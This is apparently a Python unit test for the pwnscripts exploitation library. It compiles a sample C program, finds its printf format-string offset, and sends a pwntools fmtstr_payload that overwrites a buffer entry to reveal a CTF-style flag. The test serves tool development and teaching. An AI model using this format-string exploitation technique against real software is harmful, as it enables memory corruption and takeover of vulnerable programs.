import unittest as ut
from pwnscripts import *

class BinTests(ut.TestCase):
    def test_printf_buffer_bruteforce(self):
        # check base necessities
        assert not path.isfile('1.out')
        assert path.isfile('/usr/bin/gcc')
        
        try:
            system('./examples/1.c')    # compile the program
            context.log_level = 'WARN'
            context.binary = '1.out'
            
            def printf(l: str): # First, a function to abstract C printf() i/o
                r = context.binary.process()
                r.sendafter('\n', l)
                return r.recvline()
            
            # Let's say we want to write to s[56]. We first find the printf() offset to s[]:
            offset = find_printf_offset_buffer(printf)
            
            # Then, make use of pwntools' fmtstr library to write to there:
            r = context.binary.process()
            s_addr = extract_first_hex(r.recvline())  #another pwnscripts func
            payload = fmtstr_payload(offset, {s_addr+56: 0x12345678}, write_size='short')
            r.sendline(payload)
            
            # Finally, grab back the input (and verify that the flag is there)
            lastline = r.recvall().split(b'\n')[-1]
            r.close()
            self.assertEqual(lastline, b'flag{Goodjob}')
            
        finally:
            system('rm 1.out')
        
if __name__ == '__main__':
    ut.main()
